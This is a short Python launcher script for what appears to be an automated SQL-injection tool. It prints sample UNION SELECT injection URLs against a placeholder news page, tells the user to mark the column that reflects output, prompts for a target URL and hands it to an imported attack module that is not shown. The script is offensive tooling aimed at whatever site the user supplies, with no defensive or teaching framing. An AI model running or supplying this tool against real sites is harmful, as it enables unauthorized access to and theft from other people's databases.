#!./bin/python3
import json
from modules import Terminal, Output

Terminal().clear()
print(Terminal().benner())
try:
    print("[!] INFO     : change the number to a star, if the number issued a response on the target page")
    print("[!] From     : https://www.target.com/readnews.php?id=28+and+0+union+select+1,2,3,4,5--+-")
    print("[!] To       : https://www.target.com/readnews.php?id=28+and+0+union+select+1,*,3,4,5--+-")
    url = input("\n[?] Your target url : ")
    Terminal = Terminal().setup(url)
    Terminal.run()
except KeyboardInterrupt:
    print("\n[!] KeyboardInterrupt detected")
    print("[!] See You Next Time\n")
    exit()
except Exception as e:
    print("\n[!] Could not get a response from the target\n")
    exit()